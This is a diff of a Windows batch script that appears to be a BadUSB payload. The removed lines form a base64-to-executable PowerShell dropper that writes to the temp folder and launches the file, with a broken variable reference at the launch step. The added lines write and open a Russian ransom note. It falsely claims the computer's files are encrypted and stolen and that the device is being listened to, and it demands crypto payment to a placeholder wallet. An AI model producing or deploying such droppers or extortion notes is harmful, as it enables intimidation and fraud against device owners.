@@ -1,8 +1,9 @@
-@echo $base64 = "0J/RgNC+0YHRgtC+INGC0LXRgdGCLCDQtdGB0LvQuCDQsdGD0LTQtdGCINGA0LDQsdC+0YLQsNGC0Ywg0LfQsNC80LXQvdGOINC90LAg0YDQtdCw0LvRjNC90YvQuSDQutC+0LQK0KPQsdGA0LDQuyDRh9GC0L4t0LHRiyDRgtGLINC90LUg0LTRg9C80LDQuyDQv9C+0Lsg0LPQvtC00LAgOik=" >> %temp%\wio4nfosn4otnsa.ps1
-@echo $bytes = [Convert]::FromBase64String($base64) >> %temp%\wio4nfosn4otnsa.ps1
-@echo $text = [System.Text.Encoding]::Unicode.GetString($bytes) >> %temp%\wio4nfosn4otnsa.ps1
-@echo $e = "$env:TEMP\wkfpzmwopynsowntovmsxp.exe" >> %temp%\wio4nfosn4otnsa.ps1
-@echo [IO.File]::WriteAllText($e, $text, [System.Text.Encoding]::Unicode) >> %temp%\wio4nfosn4otnsa.ps1
-@echo Start-Process $exePath >> %temp%\wio4nfosn4otnsa.ps1
+@echo off
+cd %temp%
+set mfolder=%random%%random%
+md %mfolder%
+cd %mfolder%
 
-start powershell.exe %temp%\wio4nfosn4otnsa.ps1
+echo Приветствую! Компьютор взломан и вирус уже был полностью иницилизирован, что означает что перезагрузка или ещё что-либо не поможет. Все файлы зашифрованы и отправленны на сервера в том числе и данные браузера, карты, пароли, история, также в данный момент устройство прослушиваеться так что удачи! Во избежания выкладывания частной информации в интернет отправьте 0,000012 BTC (50 USDT) на Кошелек 123456789. Удачи. >> WeLoveBadUSB.txt
+start WeLoveBadUSB.txt
+exit
